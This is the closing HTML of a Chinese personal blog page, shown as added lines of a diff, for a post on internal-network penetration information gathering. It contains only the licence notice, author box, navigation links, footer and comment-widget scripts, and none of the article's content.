+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="https://ruan0423.github.io/2023/10/30/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E7%B2%BE%E7%AE%80%E8%AF%A6%E7%BB%86%E7%AF%87/" title="内网渗透-信息收集(精简详细篇)" target="_blank" rel="external">https://ruan0423.github.io/2023/10/30/内网渗透-信息收集-精简详细篇/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="" target="_blank"><span class="text-dark">Traveler</span><small class="ml-1x">(((((((((((っ•ω•)っ Σ(σ｀•ω•´)σ 起飞！</small></a></h3>
+        <div>学习笔记记录。</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2023/11/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/" title="内网渗透-隧道搭建"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
+    </li>
+    
+    
+    <li class="next">
+      <a href="/2023/10/29/python%E4%B9%8Bre%E5%BA%93%EF%BC%8C%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE/" title="python之re库，正则表达"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
+  
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/Ruan0423" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://weibo.com/" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: 'Qr1jC5GCcGJRmvAJlssjvQPO-gzGzoHsz',
+    appKey: 'tsXijZklHIrwH2qJV39XrJLd',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+
+
+</body>
+</html>
